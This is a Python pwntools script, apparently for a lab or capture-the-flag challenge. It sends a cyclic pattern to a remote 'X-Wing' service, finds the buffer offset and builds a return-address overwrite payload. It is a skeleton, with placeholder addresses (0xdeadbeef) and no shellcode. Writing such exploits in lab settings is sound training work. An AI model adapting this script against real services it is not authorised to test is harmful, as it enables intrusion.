from pwn import *

# Step 1: Create a connection to the remote server
host = "hlabs.helb-prigogine.be"
port = 8024

# Step 2: Generate a cyclic pattern to find the offset
pattern = cyclic(100)  # Generates a 100-character unique pattern

# Step 3: Create a function to send the pattern to the server and get a crash
def send_pattern():
    r = remote(host, port)  # Connect to the server
    r.recvuntil("-->Enter your command to control your X-Wing: ")  # Wait for input prompt
    print(f"Sending pattern: {pattern}")
    r.sendline(pattern)  # Send the pattern to the server
    r.interactive()  # Keep connection open to manually interact if needed
    r.close()  # Close the connection

# Step 4: Find the offset after causing a crash (manually check the crash address)
def find_offset(crash_address):
    offset = cyclic_find(crash_address)  # Finds the offset based on crash address
    print(f"Offset found: {offset}")
    return offset

# Step 5: Build the exploit payload (replace with actual shell/gadget later)
def build_payload(offset):
    # Fill the buffer up to the return address
    padding = b"A" * offset
    # Overwrite the return address with a placeholder (replace 0xdeadbeef with actual address)
    return_address = p64(0xdeadbeef)  # Placeholder address to overwrite return
    payload = padding + return_address
    return payload

# Step 6: Send the exploit payload to the server
def send_exploit(payload):
    r = remote(host, port)  # Connect to the server
    r.recvuntil("-->Enter your command to control your X-Wing: ")  # Wait for input prompt
    print(f"Sending payload: {payload}")
    r.sendline(payload)  # Send the exploit payload to the server
    r.interactive()  # Keep connection open to manually interact if needed
    r.close()  # Close the connection

# Main logic
if __name__ == "__main__":
    # Step 3: Uncomment this to send the pattern first
    # send_pattern()

    # Step 4: After sending the pattern, analyze the crash manually, and input the crash address here:
    crash_address = 0x61616161  # Replace with actual crash address (e.g., from GDB or remote crash)
    offset = find_offset(crash_address)

    # Step 5: Build and send the final exploit payload
    payload = build_payload(offset)
    send_exploit(payload)
